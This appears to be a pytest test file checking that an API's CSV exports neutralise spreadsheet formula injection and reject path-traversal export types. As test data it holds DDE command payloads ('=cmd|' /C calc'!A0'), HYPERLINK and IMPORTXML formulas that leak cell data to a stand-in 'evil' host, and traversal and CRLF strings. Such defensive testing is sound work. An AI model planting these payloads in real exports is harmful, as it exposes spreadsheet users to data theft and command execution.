"""Integration and regression tests guarding CSV exports against formula injection
(OWASP CSV/Excel injection, CWE-1236) across handle_export and /export endpoints.
"""

from __future__ import annotations

import csv
import datetime
import io
import os
import types
import typing
import uuid

import pytest
from api import errors, models, ports
from api.helpers import auth, data
from api.typings import SessionFactory
from httpx import AsyncClient

if typing.TYPE_CHECKING:
    from tests.conftest import MockStorage


class _FormulaObject:
    """Arbitrary non-str object whose string representation starts with '='."""

    def __init__(self, payload: str) -> None:
        self._payload = payload

    def __str__(self) -> str:
        return self._payload


async def _create_user_with_scopes(
    test_app: typing.Any,
    session_factory: SessionFactory,
    scopes: list[str],
    *,
    name: str = "Export Test User",
    email_address: str | None = None,
    customer_id: str | None = None,
    region: str | None = None,
    state: str | None = None,
) -> tuple[models.User, str]:
    role = models.Role(
        name=f"role-{uuid.uuid4()}",
        display_name={"en-US": "Role"},
        description={"en-US": "Role"},
        scopes=scopes,
    )
    user = models.User(
        external_id=None,
        customer_id=customer_id,
        type=models.UserType.PASSWORD,
        name=name,
        email_address=email_address or f"export-{uuid.uuid4().hex[:10]}@example.com",
        role_id=role.id,
        region=region,
        state=state,
    )
    now = datetime.datetime.now(datetime.UTC)
    session_row = models.Session(
        id=uuid.uuid4(),
        user_id=user.id,
        expires_at=now + datetime.timedelta(hours=1),
    )
    async with session_factory() as session:
        session.add(role)
        await session.flush()
        session.add(user)
        await session.flush()
        session.add(session_row)
        await session.commit()

    secret_manager = test_app.state.injector.get(ports.SecretManager)
    private_key = await secret_manager.read("private-key")
    assert private_key is not None
    token = auth.create_token(
        issued_at=now,
        certificate=str(private_key),
        subject=str(session_row.id),
        audience="test-project",
        scopes=set(scopes),
        duration=datetime.timedelta(hours=1),
    )
    return user, token


def _capture_csv_uploads(
    mock_storage: MockStorage,
) -> list[tuple[str, str, str]]:
    """Patch mock_storage.upload_by_file to capture (gcs_path, local_path, csv_text)."""
    captured: list[tuple[str, str, str]] = []

    async def _upload_by_file(path: str, audio_path: str) -> str:
        mock_storage.upload_file_calls.append((path, audio_path))
        with open(audio_path, encoding="utf-8", newline="") as f:
            captured.append((path, audio_path, f.read()))
        return f"{mock_storage.storage_path}/{path}"

    mock_storage.upload_by_file = _upload_by_file  # type: ignore[method-assign]
    return captured


def _parse_csv_rows(csv_text: str) -> list[dict[str, str]]:
    return list(csv.DictReader(io.StringIO(csv_text)))


FORMULA_PAYLOADS: list[str] = [
    '=HYPERLINK("http://evil/?"&A1,"click")',
    "=cmd|' /C calc'!A0",
    '=IMPORTXML(CONCAT("http://evil/?",A1),"//a")',
    "+cmd|' /C calc'!A0",
    "+1+1",
    "-2+3+cmd|' /C calc'!A0",
    "-1+1",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\tbenign",
    "\r=1+1",
    "\rbenign",
    "\n=1+1",
    " =1+1",
    "   +cmd|' /C calc'!A0",
    " \t\r\n -2+3",
    "  @SUM(1,1)",
    "\u00a0=1+1",
    "\ufeff=1+1",
    "\x00=1+1",
    "\v=1+1",
    "\f+1+1",
]


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_sanitize_csv_cell_neutralizes_formula_payloads(payload: str) -> None:
    """Every OWASP CSV-injection trigger and leading-whitespace bypass is prefixed."""
    sanitized = data.sanitize_csv_cell(payload)
    assert sanitized == f"'{payload}"
    assert sanitized.startswith("'")


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        (None, ""),
        ("", ""),
        ("Alice Silva", "Alice Silva"),
        ("alice@example.com", "alice@example.com"),
        ("alice+tag@example.com", "alice+tag@example.com"),
        ("Escola São José - Unidade 2", "Escola São José - Unidade 2"),
        ("1º Ano + Reforço", "1º Ano + Reforço"),
        ("   plain text", "   plain text"),
        ("'=1+1", "'=1+1"),
        (
            uuid.UUID("550e8400-e29b-41d4-a716-446655440000"),
            "550e8400-e29b-41d4-a716-446655440000",
        ),
        (
            ["550e8400-e29b-41d4-a716-446655440000"],
            "['550e8400-e29b-41d4-a716-446655440000']",
        ),
    ],
)
def test_sanitize_csv_cell_preserves_benign_values(
    raw: typing.Any, expected: str
) -> None:
    """Legitimate strings, emails, UUIDs, lists, and None are not mangled."""
    assert data.sanitize_csv_cell(raw) == expected


def test_sanitize_csv_cell_neutralizes_custom_object_str() -> None:
    """Non-string objects whose __str__ starts with a trigger are neutralized."""
    obj = _FormulaObject("=cmd|' /C calc'!A0")
    assert data.sanitize_csv_cell(obj) == "'=cmd|' /C calc'!A0"


@pytest.mark.asyncio
async def test_handle_export_neutralizes_cells_headers_and_cleans_temp_file(
    mock_storage: MockStorage,
) -> None:
    """Smallest reproduction + temp-file cleanup + attachment signed URL check."""
    captured = _capture_csv_uploads(mock_storage)
    admin_id = uuid.uuid4()
    objs = [
        types.SimpleNamespace(
            id=uuid.uuid4(),
            name=payload,
            note=None,
        )
        for payload in FORMULA_PAYLOADS
    ]
    objs.append(
        types.SimpleNamespace(
            id=uuid.uuid4(),
            name=_FormulaObject('=HYPERLINK("http://evil/","go")'),
            note="Safe value",
        )
    )

    url = await data.handle_export(
        objs=objs,
        export_keys=["id", "name", "note"],
        user_id=admin_id,
        exp_type="users",
        storage=mock_storage,
    )

    assert url.startswith("https://storage.googleapis.com/")
    assert len(captured) == 1
    gcs_path, local_path, csv_text = captured[0]
    assert gcs_path.startswith("export/")
    assert gcs_path.endswith(f"-{admin_id.hex}-users.csv")
    assert os.path.basename(local_path).startswith("export-")
    assert not os.path.exists(local_path)

    # Signed GET URL forces attachment download as text/csv
    assert len(mock_storage.signed_url_calls) == 1
    _, signed_mime, signed_method = mock_storage.signed_url_calls[0]
    assert signed_mime == "text/csv"
    assert signed_method == "GET"
    assert mock_storage.signed_url_options[0] == {
        "response_disposition": "attachment",
        "response_type": "text/csv",
    }

    rows = list(csv.reader(io.StringIO(csv_text)))
    assert rows[0] == ["id", "name", "note"]
    for idx, payload in enumerate(FORMULA_PAYLOADS, start=1):
        assert rows[idx][1] == f"'{payload}"
        assert rows[idx][2] == ""
    assert rows[-1][1] == '\'=HYPERLINK("http://evil/","go")'
    assert rows[-1][2] == "Safe value"


@pytest.mark.asyncio
async def test_handle_export_neutralizes_malicious_headers(
    mock_storage: MockStorage,
) -> None:
    """Even header cells starting with formula triggers are prefixed."""
    captured = _capture_csv_uploads(mock_storage)
    obj = types.SimpleNamespace(**{"=header": "+1+1"})

    await data.handle_export(
        objs=[obj],
        export_keys=["=header"],
        user_id=uuid.uuid4(),
        exp_type="users",
        storage=mock_storage,
    )

    rows = list(csv.reader(io.StringIO(captured[0][2])))
    assert rows == [["'=header"], ["'+1+1"]]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_exp_type",
    ["../evil", "users/../../x", "users\\evil", "", "users\r\n", "-flag"],
)
async def test_handle_export_rejects_unsafe_exp_type(
    mock_storage: MockStorage, bad_exp_type: str
) -> None:
    """Unsafe exp_type values are rejected before creating any temp file or upload."""
    with pytest.raises(errors.InvalidField):
        await data.handle_export(
            objs=[],
            export_keys=["id"],
            user_id=uuid.uuid4(),
            exp_type=bad_exp_type,
            storage=mock_storage,
        )
    assert mock_storage.upload_file_calls == []


@pytest.mark.asyncio
async def test_handle_export_cleans_up_temp_file_on_upload_error(
    mock_storage: MockStorage,
) -> None:
    """Temporary export file is removed in finally even if GCS upload fails."""
    seen_paths: list[str] = []

    async def _failing_upload(path: str, audio_path: str) -> str:
        seen_paths.append(audio_path)
        assert os.path.exists(audio_path)
        raise RuntimeError("Simulated GCS failure")

    mock_storage.upload_by_file = _failing_upload  # type: ignore[method-assign]

    with pytest.raises(RuntimeError, match="Simulated GCS failure"):
        await data.handle_export(
            objs=[types.SimpleNamespace(name="=1+1")],
            export_keys=["name"],
            user_id=uuid.uuid4(),
            exp_type="users",
            storage=mock_storage,
        )

    assert len(seen_paths) == 1
    assert not os.path.exists(seen_paths[0])


@pytest.mark.asyncio
async def test_users_export_endpoint_neutralizes_formula_injection(
    test_app: typing.Any,
    unauthenticated_client: AsyncClient,
    session_factory: SessionFactory,
    mock_storage: MockStorage,
) -> None:
    """End-to-end: GET /api/v1/users/export neutralizes malicious user fields."""
    captured = _capture_csv_uploads(mock_storage)
    _, admin_token = await _create_user_with_scopes(
        test_app, session_factory, ["admin"], name="Legit Admin"
    )
    suffix = uuid.uuid4().hex[:8]
    evil_name = '=HYPERLINK("http://evil/?"&A1,"click")'
    evil_email = f"+{suffix}@example.com"
    evil_cid = "=cmd|' /C calc'!A0"
    evil_region = "@SUM(1+1)"

    victim_user, _ = await _create_user_with_scopes(
        test_app,
        session_factory,
        ["user"],
        name=evil_name,
        email_address=evil_email,
        customer_id=evil_cid,
        region=evil_region,
        state="SP",
    )

    resp = await unauthenticated_client.get(
        "/api/v1/users/export",
        params={"roles": [str(victim_user.role_id)]},
        headers={"Authorization": f"Bearer {admin_token}"},
    )

    assert resp.status_code == 200
    assert "url" in resp.json()
    assert len(captured) == 1
    rows = _parse_csv_rows(captured[0][2])
    by_id = {row["id"]: row for row in rows}
    exported = by_id[str(victim_user.id)]

    assert exported["name"] == f"'{evil_name}"
    assert exported["email_address"] == f"'{evil_email}"
    assert exported["customer_id"] == f"'{evil_cid}"
    assert exported["region"] == f"'{evil_region}"
    assert exported["state"] == "SP"
    assert not os.path.exists(captured[0][1])


@pytest.mark.asyncio
async def test_organizations_export_endpoint_neutralizes_formula_injection(
    test_app: typing.Any,
    unauthenticated_client: AsyncClient,
    session_factory: SessionFactory,
    mock_storage: MockStorage,
) -> None:
    """End-to-end: GET /api/v1/organizations/export neutralizes malicious org fields."""
    captured = _capture_csv_uploads(mock_storage)
    _, admin_token = await _create_user_with_scopes(
        test_app, session_factory, ["admin"], name="Org Export Admin"
    )
    evil_org_name = "=cmd|' /C calc'!A0"
    evil_org_city = "  +IMPORTXML(\"http://evil/\",\"//a\")"
    evil_org_region = "\t=1+1"
    evil_org_cid = "-2+3+cmd|' /C calc'!A0"

    org = models.Organization(
        name=evil_org_name,
        city=evil_org_city,
        state="PR",
        customer_id=evil_org_cid,
        region=evil_org_region,
    )
    async with session_factory() as session:
        session.add(org)
        await session.commit()

    resp = await unauthenticated_client.get(
        "/api/v1/organizations/export",
        headers={"Authorization": f"Bearer {admin_token}"},
    )

    assert resp.status_code == 200
    assert len(captured) == 1
    rows = _parse_csv_rows(captured[0][2])
    by_id = {row["id"]: row for row in rows}
    exported = by_id[str(org.id)]

    assert exported["name"] == f"'{evil_org_name}"
    assert exported["city"] == f"'{evil_org_city}"
    assert exported["region"] == f"'{evil_org_region}"
    assert exported["customer_id"] == f"'{evil_org_cid}"
    assert exported["state"] == "PR"


@pytest.mark.asyncio
async def test_groups_export_endpoint_neutralizes_formula_injection(
    test_app: typing.Any,
    unauthenticated_client: AsyncClient,
    session_factory: SessionFactory,
    mock_storage: MockStorage,
) -> None:
    """End-to-end: GET /api/v1/groups/export succeeds and neutralizes formula cells."""
    captured = _capture_csv_uploads(mock_storage)
    _, admin_token = await _create_user_with_scopes(
        test_app, session_factory, ["admin"], name="Group Export Admin"
    )
    suffix = uuid.uuid4().hex[:6]
    evil_series_name = f"=1+1-{suffix}"
    evil_shift_code = f"+sh{suffix}"
    evil_group_name = '=HYPERLINK("http://evil/?x","g")'
    evil_group_cid = "\r=cmd|' /C calc'!A0"

    org = models.Organization(
        name=f"Safe Org {suffix}",
        city="Curitiba",
        state="PR",
        customer_id=f"org-{suffix}",
        region="Sul",
    )
    series = models.Series(name=evil_series_name, code=f"S{suffix}")
    shift = models.WorkShift(name=f"Shift {suffix}", code=evil_shift_code)
    group = models.Group(
        name=evil_group_name,
        customer_id=evil_group_cid,
        organization_id=org.id,
        series_id=series.id,
        shift_id=shift.id,
    )
    async with session_factory() as session:
        session.add_all([org, series, shift])
        await session.flush()
        session.add(group)
        await session.commit()

    resp = await unauthenticated_client.get(
        "/api/v1/groups/export",
        params={"organizations": [str(org.id)]},
        headers={"Authorization": f"Bearer {admin_token}"},
    )

    assert resp.status_code == 200
    assert len(captured) == 1
    rows = _parse_csv_rows(captured[0][2])
    by_id = {row["id"]: row for row in rows}
    exported = by_id[str(group.id)]

    assert exported["name"] == f"'{evil_group_name}"
    assert exported["customer_id"] == f"'{evil_group_cid}"
    assert exported["grade"] == f"'{evil_series_name}"
    assert exported["shift"] == f"'{evil_shift_code.lower()}"
    assert exported["organization_id"] == str(org.id)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "endpoint",
    [
        "/api/v1/users/export",
        "/api/v1/groups/export",
        "/api/v1/organizations/export",
    ],
)
async def test_export_endpoints_require_admin_auth(
    test_app: typing.Any,
    unauthenticated_client: AsyncClient,
    session_factory: SessionFactory,
    endpoint: str,
) -> None:
    """Export endpoints remain admin-only (403 unauthenticated, 401 non-admin)."""
    unauth_resp = await unauthenticated_client.get(endpoint)
    assert unauth_resp.status_code == 403

    _, user_token = await _create_user_with_scopes(
        test_app, session_factory, ["user"]
    )
    non_admin_resp = await unauthenticated_client.get(
        endpoint, headers={"Authorization": f"Bearer {user_token}"}
    )
    assert non_admin_resp.status_code == 401
